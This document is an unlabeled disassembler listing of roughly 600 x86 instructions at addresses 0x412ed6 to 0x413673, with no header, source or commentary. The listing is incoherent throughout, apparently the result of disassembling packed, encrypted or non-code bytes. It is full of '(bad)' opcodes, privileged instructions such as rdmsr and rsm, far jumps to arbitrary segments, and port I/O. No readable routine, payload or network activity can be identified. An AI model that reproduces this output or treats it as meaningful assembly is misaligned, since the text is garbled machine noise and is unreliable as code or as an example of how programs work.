  412ed6:	rcr    bl,cl
  412ed8:	mov    ch,0x34
  412eda:	lock adc dh,BYTE PTR [eax+edi*8-0x1161a695]
  412ee2:	cmc    
  412ee3:	mov    bh,BYTE PTR [esp+edx*1]
  412ee6:	daa    
  412ee7:	loope  0x412ef0
  412ee9:	test   ebp,ecx
  412eeb:	adc    edi,DWORD PTR [edx+esi*1]
  412eee:	stos   DWORD PTR es:[di],eax
  412ef0:	push   esi
  412ef1:	aaa    
  412ef2:	mov    eax,ds:0x69d47661
  412ef7:	push   es
  412ef8:	adc    al,0x86
  412efa:	fucom  st(2)
  412efc:	sub    eax,0xcdab2f63
  412f01:	rcl    DWORD PTR [edi],0xe8
  412f04:	dec    edi
  412f05:	mov    esi,0x4a69d797
  412f0a:	mov    ebp,0xeaabcc7f
  412f0f:	sbb    eax,0xfc67494d
  412f14:	and    BYTE PTR [edi-0x74],cl
  412f17:	int    0x9b
  412f19:	or     ebp,ebp
  412f1b:	lea    ebp,[esi-0x37eddd08]
  412f21:	add    bl,BYTE PTR [esi-0x429b4c2b]
  412f27:	and    ecx,DWORD PTR [esi+0x79119590]
  412f2d:	jbe    0x412f29
  412f2f:	lds    esi,FWORD PTR [eax+0x179a5060]
  412f35:	mov    eax,ds:0xffb49912
  412f3a:	ins    DWORD PTR es:[edi],dx
  412f3b:	test   eax,0x966b32bb
  412f40:	imul   DWORD PTR [esi]
  412f42:	loopne 0x412f99
  412f44:	xchg   esp,eax
  412f45:	pop    es
  412f46:	loope  0x412fbe
  412f48:	jp     0x412f6b
  412f4a:	jmp    0x412fb8
  412f4c:	push   ebx
  412f4d:	dec    ecx
  412f4e:	fwait
  412f4f:	popf   
  412f50:	fimul  DWORD PTR [eax+0x1f]
  412f53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412f54:	sub    al,0x80
  412f56:	ds repnz mov edx,0xbbb39619
  412f5d:	jmp    0xbb38:0x5d0eb9bc
  412f64:	push   0x113125a6
  412f69:	(bad)  
  412f6a:	icebp  
  412f6b:	ins    BYTE PTR es:[edi],dx
  412f6c:	xchg   esp,eax
  412f6d:	push   edx
  412f6e:	dec    ebp
  412f6f:	out    dx,eax
  412f70:	adc    al,0xf5
  412f72:	imul   edx,DWORD PTR [esi-0x6f951133],0x684ffbaa
  412f7c:	add    BYTE PTR [eax-0x2c],dh
  412f7f:	pusha  
  412f80:	ficom  WORD PTR [ebx-0x45]
  412f83:	pop    edx
  412f84:	jbe    0x412f58
  412f86:	nop    DWORD PTR [ecx]
  412f89:	ins    DWORD PTR es:[edi],dx
  412f8a:	fbstp  TBYTE PTR [ebp-0x1f8ba927]
  412f90:	rcr    ecx,1
  412f92:	jo     0x412f97
  412f94:	(bad)  
  412f95:	push   ds
  412f96:	push   ss
  412f97:	int3   
  412f98:	mov    edx,0x93092273
  412f9d:	cli    
  412f9e:	cmp    BYTE PTR [eax-0x24],ch
  412fa1:	cmp    bl,BYTE PTR [ebx]
  412fa3:	retf   
  412fa4:	adc    eax,0x1fcbe7cd
  412fa9:	or     DWORD PTR [ebx+0x1c39f14f],esp
  412faf:	scas   al,BYTE PTR es:[edi]
  412fb0:	pop    DWORD PTR [ebx-0x7e188a3c]
  412fb6:	inc    ebx
  412fb7:	aas    
  412fb8:	in     eax,dx
  412fb9:	lds    esp,FWORD PTR [ecx]
  412fbb:	jle    0x41301f
  412fbd:	xchg   ecx,eax
  412fbe:	push   ebx
  412fbf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412fc0:	imul   ebx,eax,0x84ac9243
  412fc6:	scas   eax,DWORD PTR es:[edi]
  412fc7:	sahf   
  412fc8:	mov    dl,0x8e
  412fca:	mov    BYTE PTR [edi-0x66],ch
  412fcd:	outs   dx,BYTE PTR ds:[esi]
  412fce:	jg     0x412f7e
  412fd0:	mov    bh,0x2e
  412fd2:	xor    ecx,edx
  412fd4:	inc    ebx
  412fd5:	mov    WORD PTR [eax-0x5a],?
  412fd8:	call   0x3569:0xbff3135f
  412fdf:	fnsave [edi+0x5c]
  412fe2:	cmp    DWORD PTR [edx+0xa],eax
  412fe5:	leave  
  412fe6:	(bad)  
  412fe7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412fe8:	fst    QWORD PTR [esp+edi*4]
  412feb:	adc    cl,bh
  412fed:	scas   eax,DWORD PTR es:[edi]
  412fee:	dec    edx
  412fef:	add    al,0x49
  412ff1:	pop    ss
  412ff2:	and    ah,dh
  412ff4:	ins    DWORD PTR es:[edi],dx
  412ff5:	inc    edi
  412ff6:	adc    ebx,esp
  412ff8:	xor    ah,BYTE PTR [esi+0x55]
  412ffb:	and    eax,0x39e0c5be
  413000:	xchg   ecx,eax
  413001:	scas   eax,DWORD PTR es:[edi]
  413002:	test   ebx,eax
  413004:	test   al,0x7c
  413006:	popa   
  413007:	sbb    eax,0xb46411e0
  41300c:	xchg   ebx,eax
  41300d:	gs out dx,al
  41300f:	jge    0x412faf
  413011:	xchg   edx,eax
  413012:	jnp    0x413046
  413014:	les    ebp,FWORD PTR [edi+0x4426a257]
  41301a:	out    0x78,eax
  41301c:	out    dx,al
  41301d:	xor    eax,0xe601db1d
  413022:	pop    ebx
  413023:	test   al,0x77
  413025:	std    
  413026:	cld    
  413027:	mov    dh,0xb3
  413029:	xchg   esp,eax
  41302a:	sbb    BYTE PTR [edi-0x1c],ah
  41302d:	xchg   edi,eax
  41302e:	mov    ch,al
  413030:	pop    ebx
  413031:	rdmsr  
  413033:	div    dh
  413035:	sub    al,0xa4
  413037:	cmp    ebp,DWORD PTR [esi-0x109a9d31]
  41303d:	xor    DWORD PTR [eax+edi*1+0x13945167],ebx
  413044:	mov    bh,0xdf
  413046:	jl     0x413079
  413048:	and    eax,0x85d5fa50
  41304d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41304e:	inc    edi
  41304f:	imul   esp,DWORD PTR [edx+edx*8-0x51c64c28],0xa334d877
  41305a:	ja     0x41302b
  41305c:	push   esp
  41305d:	inc    esi
  41305e:	and    al,0x39
  413060:	lods   eax,DWORD PTR ss:[esi]
  413062:	cmp    DWORD PTR [eax-0x2],edx
  413065:	mov    ah,0xf1
  413067:	or     al,0x4
  413069:	data16 fisttp DWORD PTR [ebx]
  41306c:	xchg   BYTE PTR [ebx],ah
  41306e:	pop    edx
  41306f:	retf   
  413070:	test   ebp,0xd57b31b
  413076:	popf   
  413077:	push   esp
  413078:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413079:	mov    ebp,0x2deab730
  41307e:	cli    
  41307f:	cmc    
  413080:	js     0x4130d4
  413082:	lock pop ss
  413084:	retf   
  413085:	(bad)  
  413086:	fdivr  DWORD PTR ds:0x90a431d0
  41308c:	cmp    bl,ah
  41308e:	xor    eax,esp
  413090:	cmp    al,0xd6
  413092:	in     eax,0x8e
  413094:	push   esp
  413095:	mov    esi,DWORD PTR [edi]
  413097:	or     al,0x91
  413099:	aam    0x3d
  41309b:	pop    ss
  41309c:	dec    esi
  41309d:	ret    
  41309e:	fcmovb st,st(7)
  4130a0:	adc    ch,BYTE PTR [esi-0x24bacd0d]
  4130a6:	sar    DWORD PTR [eax+0x37d044dd],1
  4130ac:	cwde   
  4130ad:	push   es
  4130ae:	into   
  4130af:	dec    esi
  4130b0:	inc    DWORD PTR [edi-0xc]
  4130b3:	dec    edi
  4130b4:	aad    0xfa
  4130b6:	pop    ds
  4130b7:	adc    ebx,ebx
  4130b9:	call   0x58282c90
  4130be:	sahf   
  4130bf:	cmp    ebx,DWORD PTR [edx]
  4130c1:	test   BYTE PTR [edi],dh
  4130c3:	js     0x413136
  4130c5:	add    cl,ch
  4130c7:	icebp  
  4130c8:	and    esp,DWORD PTR [edx-0xd]
  4130cb:	rcr    bl,1
  4130cd:	fisttp WORD PTR [ebx+0x37]
  4130d0:	mov    ebp,0xb3830410
  4130d5:	or     bl,BYTE PTR [edi+ebp*4+0x5c]
  4130d9:	imul   esp,ecx,0xcca0ed8e
  4130df:	pop    edx
  4130e0:	jbe    0x413135
  4130e2:	sub    ah,dh
  4130e4:	cmp    BYTE PTR [ecx-0x1ec8097e],bh
  4130ea:	es cdq 
  4130ec:	inc    edi
  4130ed:	ss xchg edi,eax
  4130ef:	mov    dh,0x14
  4130f1:	xor    DWORD PTR [esi],ebx
  4130f3:	xchg   ebp,eax
  4130f4:	out    0xbc,al
  4130f6:	pusha  
  4130f7:	jl     0x413093
  4130f9:	jmp    0x413151
  4130fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4130fc:	mov    al,ds:0x9c6940dc
  413101:	jmp    0x413104
  413103:	adc    esi,DWORD PTR ds:[ecx+eax*4]
  413107:	pop    eax
  413108:	sub    BYTE PTR [ebx-0x21133dcb],ah
  41310e:	jmp    0xa7ac62ee
  413113:	popf   
  413114:	stc    
  413115:	inc    ebx
  413116:	xchg   esp,eax
  413117:	(bad)  
  413118:	rcr    BYTE PTR [eax],1
  41311a:	retw   
  41311c:	daa    
  41311d:	pop    esi
  41311e:	inc    esi
  41311f:	jecxz  0x41318f
  413121:	nop
  413122:	push   ss
  413123:	mov    dl,0x9c
  413125:	jns    0x41316b
  413127:	(bad)  
  413129:	(bad)  
  41312b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41312c:	dec    ecx
  41312d:	test   DWORD PTR [esi+0x43],edi
  413130:	nop
  413131:	push   0xf0c3cb1
  413136:	fadd   DWORD PTR [eax+0x43]
  413139:	ret    0xd19b
  41313c:	adc    DWORD PTR [ebx-0x42947061],esp
  413142:	xor    al,0xf7
  413144:	clc    
  413145:	aas    
  413146:	mov    ds:0xbdfce50a,eax
  41314b:	cdq    
  41314c:	sbb    eax,0x1cafe88a
  413151:	or     ch,BYTE PTR [ebp-0x5f]
  413154:	inc    edx
  413155:	ror    DWORD PTR [edi-0xf],0x1a
  413159:	jmp    0x413182
  41315b:	loope  0x4131db
  41315d:	das    
  41315e:	dec    ebx
  41315f:	push   edi
  413160:	sbb    edx,ebp
  413162:	inc    ebx
  413163:	push   ebp
  413164:	xor    ecx,DWORD PTR ds:0xf4e2c5d8
  41316a:	fsubrp st(0),st
  41316c:	aas    
  41316d:	push   edi
  41316e:	mov    ds:0x7fb44eb5,al
  413173:	arpl   WORD PTR [ecx],bx
  413175:	adc    al,0x4b
  413177:	pop    ds
  413178:	rcl    edx,1
  41317a:	cmp    esi,DWORD PTR [ebp+edx*8+0x45]
  41317e:	fs mov ecx,0x1776dbb2
  413184:	jno    0x413142
  413186:	(bad)  
  413187:	dec    eax
  413188:	aaa    
  413189:	ret    0xe7f
  41318c:	jp     0x413112
  41318e:	cmp    dh,bh
  413190:	mov    ds:0x676f64d1,al
  413195:	dec    edi
  413196:	jmp    0xc82d18a0
  41319b:	das    
  41319c:	(bad)  
  41319d:	outs   dx,DWORD PTR ds:[esi]
  41319e:	and    cl,dl
  4131a0:	jbe    0x413145
  4131a2:	ds mov bh,0x4a
  4131a5:	and    eax,0x182d3da7
  4131aa:	out    0x38,al
  4131ac:	(bad)  
  4131ad:	out    dx,al
  4131ae:	sbb    al,bl
  4131b0:	cli    
  4131b1:	(bad)  
  4131b2:	fucompp 
  4131b4:	dec    esi
  4131b5:	push   ss
  4131b6:	aaa    
  4131b7:	aas    
  4131b8:	or     DWORD PTR [esi-0x1df3e878],ebx
  4131be:	test   al,0x75
  4131c0:	mov    esp,0x3a5aeb23
  4131c5:	xchg   edi,eax
  4131c6:	imul   ebx,esp,0x51
  4131c9:	nop
  4131ca:	mov    eax,ds:0x9f2e0bc0
  4131cf:	mov    esp,0x1e8ed7d5
  4131d4:	jmp    0x680910eb
  4131d9:	inc    ebp
  4131da:	(bad)  
  4131db:	out    dx,eax
  4131dc:	push   eax
  4131dd:	imul   edx,DWORD PTR [edi+0x37b6b76],0x9c778207
  4131e7:	(bad)  
  4131e9:	xor    al,0xeb
  4131eb:	shr    BYTE PTR [edx],0x49
  4131ee:	stos   DWORD PTR es:[edi],eax
  4131ef:	aas    
  4131f0:	mov    esp,ebx
  4131f2:	shl    DWORD PTR [edi+0x3f],cl
  4131f5:	pushf  
  4131f6:	inc    edx
  4131f7:	(bad)  
  4131f8:	fiadd  DWORD PTR [edi+0x1c4fe9ff]
  4131fe:	icebp  
  4131ff:	sbb    DWORD PTR [eax-0x2dae097c],ecx
  413205:	into   
  413206:	rcl    BYTE PTR [esi],cl
  413208:	sahf   
  413209:	leave  
  41320a:	cmp    BYTE PTR [ecx],0xa7
  41320d:	sub    eax,0x468e049a
  413212:	out    dx,eax
  413213:	xchg   ebp,eax
  413214:	add    DWORD PTR [edx+0x70],ecx
  413217:	icebp  
  413218:	lods   eax,DWORD PTR ds:[esi]
  413219:	ins    DWORD PTR es:[edi],dx
  41321a:	push   ss
  41321b:	jg     0x413237
  41321d:	adc    al,0xeb
  41321f:	mov    cl,0xc2
  413221:	add    edx,DWORD PTR [esi-0x44]
  413224:	lock cmc 
  413226:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413227:	repz rcr DWORD PTR gs:[edi-0x3b9c5633],0x57
  413230:	loope  0x4131ed
  413232:	lahf   
  413233:	loopne 0x413218
  413235:	bound  ebx,QWORD PTR [ebx+0x58]
  413238:	kxnorb k3,k3,k5
  41323c:	jne    0x4131f5
  41323e:	mov    ds:0xadf07d1f,al
  413243:	call   0xbd13:0x7f4c5e25
  41324a:	mov    al,ds:0x78d2d4f4
  41324f:	(bad)  
  413250:	loopne 0x413286
  413252:	jl     0x4131e9
  413254:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413255:	dec    ebx
  413256:	or     eax,0x85388b66
  41325b:	adc    al,0xa0
  41325d:	fsub   st,st(1)
  41325f:	adc    eax,DWORD PTR [esi-0x47]
  413262:	(bad)  
  413263:	in     eax,dx
  413264:	mov    DWORD PTR [edi-0x8f269bf],eax
  41326a:	in     al,dx
  41326b:	jmp    FWORD PTR [esi]
  41326d:	pop    edi
  41326e:	popa   
  41326f:	out    0x28,al
  413271:	sahf   
  413272:	adc    DWORD PTR [esp+eax*2],edi
  413275:	jl     0x4132ba
  413277:	push   eax
  413278:	fnstcw WORD PTR [edi+0x37a9822e]
  41327e:	nop
  41327f:	mov    dh,0xb0
  413281:	out    0x7,al
  413283:	ret    
  413284:	xchg   edx,eax
  413285:	add    al,0x7d
  413287:	jno    0x41328f
  413289:	ja     0x4132c9
  41328b:	push   ebx
  41328c:	fcom   DWORD PTR [edx]
  41328e:	sub    DWORD PTR [esi+0x31e65a01],esp
  413294:	ficomp WORD PTR [edi+0x373d9056]
  41329a:	andps  xmm6,XMMWORD PTR [eax]
  41329d:	enter  0x5dfd,0xa8
  4132a1:	rol    DWORD PTR [ecx+edx*2+0x7cc37c99],0x46
  4132a9:	fimul  DWORD PTR [esi-0x1a]
  4132ac:	or     bh,BYTE PTR [ebx]
  4132ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4132af:	inc    edx
  4132b0:	mov    dh,0x2
  4132b2:	jmp    0x98504f5
  4132b7:	jnp    0x4132a4
  4132b9:	aas    
  4132ba:	aad    0xfa
  4132bc:	std    
  4132bd:	icebp  
  4132be:	ret    0x16f8
  4132c1:	cmp    DWORD PTR [edx+0x52],esp
  4132c4:	icebp  
  4132c5:	and    edx,DWORD PTR [ecx]
  4132c7:	pop    ss
  4132c8:	shr    ecx,0x40
  4132cb:	icebp  
  4132cc:	jge    0x413340
  4132ce:	sub    ah,ah
  4132d0:	(bad)  
  4132d2:	pusha  
  4132d3:	push   esp
  4132d4:	push   ecx
  4132d5:	loope  0x413271
  4132d7:	pop    ebp
  4132d8:	inc    ecx
  4132d9:	inc    esi
  4132da:	sbb    al,0xb6
  4132dc:	jmp    0x3dcc38d4
  4132e1:	jae    0x4132a5
  4132e3:	sti    
  4132e4:	mov    ebp,0x9074e70e
  4132e9:	adc    al,bl
  4132eb:	add    ebp,DWORD PTR [esi]
  4132ed:	mov    al,0x24
  4132ef:	ret    0xfe19
  4132f2:	mov    bh,0x34
  4132f4:	mov    esi,0xfdd00683
  4132f9:	push   0x67ec1b6e
  4132fe:	sub    BYTE PTR es:[eax-0x10],dh
  413302:	ja     0x4132fb
  413304:	(bad)  [esi+ebx*8+0x1b061449]
  41330b:	(bad)  
  41330c:	popf   
  41330d:	or     BYTE PTR [eax-0x4c272813],bl
  413313:	cmp    ecx,DWORD PTR [eax-0x55]
  413316:	or     bh,BYTE PTR [ebx]
  413318:	xchg   edi,eax
  413319:	xchg   ebp,eax
  41331a:	xchg   esi,eax
  41331b:	sub    bl,BYTE PTR [ecx+0x4bf30c20]
  413321:	bound  ebx,QWORD PTR [edi]
  413323:	mov    ah,0xe7
  413325:	fbld   TBYTE PTR [ecx-0x1fc68c7f]
  41332b:	or     DWORD PTR [ebx-0x13],eax
  41332e:	aad    0xe7
  413330:	pop    ebp
  413331:	in     al,0x9c
  413333:	adc    edx,ebp
  413335:	mov    al,0x7b
  413337:	dec    ebp
  413338:	ret    0xd4c0
  41333b:	mov    ah,0x1f
  41333d:	dec    esi
  41333e:	push   ebx
  41333f:	pop    ss
  413340:	in     al,0x75
  413342:	mov    al,ds:0x662d62a5
  413347:	mov    ebx,0xd47d3f40
  41334c:	xchg   esp,eax
  41334d:	xchg   edi,eax
  41334e:	add    BYTE PTR [ebx+0x60],dh
  413351:	pop    ds
  413352:	adc    eax,0x9f2aa1b5
  413357:	jae    0x413386
  413359:	mov    ch,0x13
  41335b:	and    eax,0x19ae0158
  413360:	test   DWORD PTR [eax-0x3704594e],esi
  413366:	push   ecx
  413367:	xchg   ecx,eax
  413368:	int3   
  413369:	jno    0x41331b
  41336b:	inc    ecx
  41336c:	sub    eax,0x7c001d43
  413371:	cmp    BYTE PTR [eax+0x28],0xb7
  413375:	mov    dh,0x3
  413377:	push   ss
  413378:	ret    0xbf2b
  41337b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41337c:	push   ss
  41337d:	xor    ebx,DWORD PTR [esi+0x5]
  413380:	inc    edi
  413381:	push   0xee99e139
  413386:	xor    ebx,eax
  413388:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413389:	and    esi,0x76
  41338c:	mov    bl,0x68
  41338e:	inc    esp
  41338f:	addr16 enter 0x4e64,0x4c
  413394:	inc    ecx
  413395:	mov    dh,0x2a
  413397:	xchg   esi,eax
  413398:	or     al,BYTE PTR [esi-0x4a68d522]
  41339e:	out    dx,eax
  41339f:	jns    0x4133b6
  4133a1:	pop    edx
  4133a2:	iret   
  4133a3:	out    dx,al
  4133a4:	push   es
  4133a5:	cmp    DWORD PTR [edi-0x31],ebp
  4133a8:	xchg   DWORD PTR [edi-0x7e],eax
  4133ab:	jns    0x413395
  4133ad:	retf   
  4133ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4133af:	icebp  
  4133b0:	jmp    0x894f:0xfe79c104
  4133b7:	call   0x560f:0xdad090de
  4133be:	(bad)  
  4133bf:	or     al,0x37
  4133c1:	scas   al,BYTE PTR es:[edi]
  4133c2:	pop    ebx
  4133c3:	dec    edi
  4133c4:	sbb    DWORD PTR [esp+ebp*8+0x629df46d],esp
  4133cb:	pop    ss
  4133cc:	ficomp DWORD PTR [esp+ecx*8+0x7]
  4133d0:	ret    
  4133d1:	fs fs jmp 0xf894:0xc27954ee
  4133da:	mov    ch,0x7f
  4133dc:	inc    edx
  4133dd:	retf   
  4133de:	mov    dh,0x7b
  4133e0:	inc    ebx
  4133e1:	daa    
  4133e2:	xor    al,0x72
  4133e4:	xor    DWORD PTR ds:0x6c70839e,ebx
  4133ea:	jp     0x413452
  4133ec:	mov    esp,0x5c32bf0f
  4133f1:	inc    ebx
  4133f2:	fist   DWORD PTR [ebx]
  4133f4:	inc    ebp
  4133f5:	mov    bh,0xb2
  4133f7:	stc    
  4133f8:	fcom   QWORD PTR [ebp+0x58]
  4133fb:	gs push 0xe1a7ef05
  413401:	mov    al,ds:0xa71730ff
  413406:	mov    bl,0xa8
  413408:	jmp    0x4133b4
  41340a:	outs   dx,DWORD PTR ds:[esi]
  41340b:	pop    ebp
  41340c:	mov    eax,ds:0xeb65195f
  413411:	push   ebx
  413412:	pop    edx
  413413:	loope  0x4133d7
  413415:	mov    edx,0xf18e536d
  41341a:	or     al,0x9e
  41341c:	iret   
  41341d:	pop    es
  41341e:	jb     0x41340a
  413420:	rcl    BYTE PTR [edx+0xd],0xe3
  413424:	(bad)  
  413425:	pop    ss
  413426:	push   es
  413427:	jbe    0x413447
  413429:	sahf   
  41342a:	loopne 0x41345a
  41342c:	in     eax,dx
  41342d:	fcom   st(6)
  41342f:	pop    ds
  413430:	adc    edi,DWORD PTR [ecx+ebx*8]
  413433:	push   ds
  413434:	cwde   
  413435:	or     dl,BYTE PTR [esi+0x69df06cc]
  41343b:	mov    ch,ch
  41343d:	ret    0x6b10
  413440:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413441:	icebp  
  413442:	leave  
  413443:	outs   dx,BYTE PTR ds:[esi]
  413444:	outs   dx,DWORD PTR ds:[esi]
  413445:	jne    0x4134af
  413447:	sub    cl,bh
  413449:	outs   dx,DWORD PTR ds:[esi]
  41344a:	push   ebp
  41344b:	dec    esi
  41344c:	adc    bl,BYTE PTR [edi]
  41344e:	int3   
  41344f:	inc    ebx
  413450:	ds stos DWORD PTR es:[edi],eax
  413452:	rsm    
  413454:	mov    eax,0x3696855e
  413459:	inc    edx
  41345a:	cld    
  41345b:	(bad)  
  41345d:	jecxz  0x413472
  41345f:	or     edx,DWORD PTR [edx-0x52e4cf9f]
  413465:	mov    ss,WORD PTR [ecx-0x6ad6032e]
  41346b:	or     esp,DWORD PTR [edx+0x45e44b9d]
  413471:	gs lahf 
  413473:	pop    ebx
  413474:	cld    
  413475:	js     0x4134f2
  413477:	cmc    
  413478:	or     BYTE PTR [esi],al
  41347a:	cmp    al,0xed
  41347c:	inc    eax
  41347d:	dec    edx
  41347e:	cdq    
  41347f:	jg     0x4134ed
  413481:	icebp  
  413482:	mov    ecx,DWORD PTR [edi-0x6410a0e8]
  413488:	or     bh,BYTE PTR [edi-0x470b2e6c]
  41348e:	fadd   QWORD PTR [eax-0x26786e97]
  413494:	fsub   DWORD PTR [edi+eiz*1-0x4e3f872e]
  41349b:	xchg   BYTE PTR [edx-0x34],ch
  41349e:	inc    edi
  41349f:	mov    BYTE PTR [ecx],cl
  4134a1:	inc    ecx
  4134a2:	inc    esp
  4134a3:	pop    ecx
  4134a4:	clc    
  4134a5:	push   0xfffffffe
  4134a7:	fild   QWORD PTR [esi]
  4134a9:	cmp    ebp,DWORD PTR [eax]
  4134ab:	cmp    ah,BYTE PTR [esi+0x6414ea2d]
  4134b1:	mov    bh,bh
  4134b3:	or     BYTE PTR [eax-0x67],al
  4134b6:	dec    ebp
  4134b7:	call   0xd78c:0x8fdb428d
  4134be:	mov    esp,0x3aca4e79
  4134c3:	xchg   esp,eax
  4134c4:	and    BYTE PTR [eax+eiz*2],0xfd
  4134c8:	add    dh,BYTE PTR cs:[edx-0xb]
  4134cc:	xor    ebp,DWORD PTR [edx+ebx*1+0x6e]
  4134d0:	add    DWORD PTR [ecx],esi
  4134d2:	add    DWORD PTR [eax-0x57d7a8b8],edx
  4134d8:	cdq    
  4134d9:	repz push ecx
  4134db:	dec    esi
  4134dc:	cmp    eax,0x8661989b
  4134e1:	xor    eax,0xd6385d27
  4134e6:	jne    0x41346f
  4134e8:	jb     0x413533
  4134ea:	(bad)  
  4134eb:	(bad)  
  4134ec:	mov    al,ds:0xb8186ba4
  4134f1:	mov    esi,0x598760e5
  4134f6:	push   eax
  4134f7:	fdivr  DWORD PTR [esi-0x80]
  4134fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4134fb:	in     eax,0x32
  4134fd:	in     al,0x3f
  4134ff:	imul   eax,esp,0xfffffff9
  413502:	outs   dx,BYTE PTR ds:[esi]
  413503:	mov    edx,DWORD PTR [ebp+0x4a]
  413506:	cdq    
  413507:	adc    eax,0xc3c060ad
  41350c:	pop    ss
  41350d:	jno    0x413509
  41350f:	pop    edi
  413510:	jle    0x413540
  413512:	cmp    al,0x61
  413514:	jmp    0x4134f2
  413516:	jo     0x4134e3
  413518:	jge    0x4134ab
  41351a:	sbb    edi,DWORD PTR [edx-0x13]
  41351d:	and    cl,cl
  41351f:	scas   eax,DWORD PTR es:[edi]
  413520:	push   ss
  413521:	pop    esi
  413522:	xchg   ebp,eax
  413523:	xchg   esp,eax
  413524:	add    eax,0x3c7aaff3
  413529:	or     BYTE PTR [ecx-0x79],ch
  41352c:	mov    bl,0x29
  41352e:	lods   eax,DWORD PTR ds:[esi]
  41352f:	cmp    DWORD PTR [esi+eiz*2-0x7a],esp
  413533:	repnz sbb DWORD PTR [ebp+0x6edb0522],ecx
  41353a:	and    eax,0x38eccc60
  41353f:	adc    DWORD PTR [edx+0xf593434],esp
  413545:	mov    esp,0xf9a0a55c
  41354a:	mov    ds,edx
  41354c:	xchg   edx,eax
  41354d:	stos   BYTE PTR es:[edi],al
  41354e:	pop    ebp
  41354f:	push   eax
  413550:	neg    BYTE PTR [eax-0x1c20b29e]
  413556:	ins    DWORD PTR es:[edi],dx
  413557:	mov    esp,DWORD PTR [edx-0xf7e8b05]
  41355d:	adc    al,0x1d
  41355f:	sub    al,0x7d
  413561:	xor    al,0x85
  413563:	add    BYTE PTR [edx],ch
  413565:	fst    st(4)
  413567:	stos   DWORD PTR es:[edi],eax
  413568:	repz addr16 mov eax,0x39f4f36d
  41356f:	sbb    bl,BYTE PTR [ebp-0x28331589]
  413575:	or     BYTE PTR [eax+eax*2],bh
  413578:	cmp    cl,BYTE PTR [ebx]
  41357a:	scas   al,BYTE PTR es:[edi]
  41357b:	jmp    0x8bad:0xe5a02928
  413582:	xor    dl,BYTE PTR [esi+edi*1]
  413585:	icebp  
  413586:	ficomp DWORD PTR [ebp+0x1e]
  413589:	mov    ah,0x8b
  41358b:	clc    
  41358c:	sbb    BYTE PTR [esi+0x58],bh
  41358f:	mov    esp,0xd8df2b3
  413594:	les    eax,FWORD PTR [esi]
  413596:	aas    
  413597:	scas   al,BYTE PTR es:[edi]
  413598:	push   eax
  413599:	xchg   esi,eax
  41359a:	pop    ss
  41359b:	cdq    
  41359c:	pop    ebx
  41359d:	repnz inc esi
  41359f:	jno    0x413590
  4135a1:	xchg   edx,eax
  4135a2:	cmp    BYTE PTR ds:[edx],dl
  4135a5:	ret    
  4135a6:	nop
  4135a7:	fst    QWORD PTR [edx+0x53]
  4135aa:	rcl    ah,cl
  4135ac:	inc    ecx
  4135ad:	scas   al,BYTE PTR es:[edi]
  4135ae:	xor    BYTE PTR [ebx],ah
  4135b0:	test   BYTE PTR [ebp+0x29],bh
  4135b3:	neg    DWORD PTR [ebp-0x65244517]
  4135b9:	push   ebp
  4135ba:	icebp  
  4135bb:	lods   al,BYTE PTR ds:[esi]
  4135bc:	ss pop edx
  4135be:	scas   eax,DWORD PTR es:[edi]
  4135bf:	lods   eax,DWORD PTR ds:[esi]
  4135c0:	mov    esp,0xeceff1c0
  4135c5:	lods   eax,DWORD PTR ds:[esi]
  4135c6:	ficomp DWORD PTR [ecx]
  4135c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4135c9:	jecxz  0x413571
  4135cb:	mov    BYTE PTR [ebx-0x1e3b50bc],ch
  4135d1:	mov    ah,0x99
  4135d3:	mov    ds:0xf5a21c72,eax
  4135d8:	test   al,0x90
  4135da:	push   0xffffffe3
  4135dc:	push   esp
  4135dd:	and    BYTE PTR [esp+esi*2],ch
  4135e0:	dec    esp
  4135e1:	sahf   
  4135e2:	leave  
  4135e3:	fwait
  4135e4:	cli    
  4135e5:	cmp    DWORD PTR [esp+ecx*2+0x69],edi
  4135e9:	sub    al,0x4c
  4135eb:	(bad)  
  4135ec:	scas   al,BYTE PTR es:[edi]
  4135ed:	cs and eax,0xbdf32400
  4135f3:	in     al,dx
  4135f4:	and    bl,ch
  4135f6:	fsub   DWORD PTR [ebx+eax*1-0x49]
  4135fa:	xchg   edx,eax
  4135fb:	mov    al,ds:0xc28774ac
  413600:	repnz shl BYTE PTR [edi+0x49],cl
  413604:	test   DWORD PTR [eax],ebx
  413606:	aam    0x95
  413608:	pop    esp
  413609:	neg    esi
  41360b:	and    edi,DWORD PTR es:[edx+0x42]
  41360f:	mov    bl,0x4a
  413611:	adc    BYTE PTR [ebx],dh
  413613:	gs jmp 0x9ead:0xbdb81680
  41361b:	mov    ebx,gs
  41361d:	jle    0x4135a9
  41361f:	cmp    eax,0xb2adbbb3
  413624:	sbb    edx,esp
  413626:	pop    ecx
  413627:	and    dl,ah
  413629:	fistp  QWORD PTR [edx]
  41362b:	cli    
  41362c:	inc    ebp
  41362d:	repz push esp
  41362f:	push   0x949f3e4f
  413634:	and    BYTE PTR [ebx-0x7c794f6],dh
  41363a:	mov    esp,eax
  41363c:	je     0x41361e
  41363e:	jo     0x4136b5
  413640:	lock pop ebp
  413642:	ds enter 0x883,0x2
  413647:	add    BYTE PTR [edi-0x39],cl
  41364a:	cmp    DWORD PTR [edi],ecx
  41364c:	sub    BYTE PTR [ebx],dl
  41364e:	aaa    
  41364f:	cmp    edi,DWORD PTR [ebp+0x19]
  413652:	cs es lahf 
  413655:	loop   0x4136c6
  413657:	add    BYTE PTR [ecx+0x516c43b8],dh
  41365d:	inc    esp
  41365e:	cmp    eax,0x5d42f103
  413663:	bound  eax,QWORD PTR [edi-0x8]
  413666:	and    ebx,edi
  413668:	adc    eax,0xb729c8ac
  41366d:	xor    BYTE PTR [esi+0xd8b72b1],bh
  413673:	xchg   ecx,eax
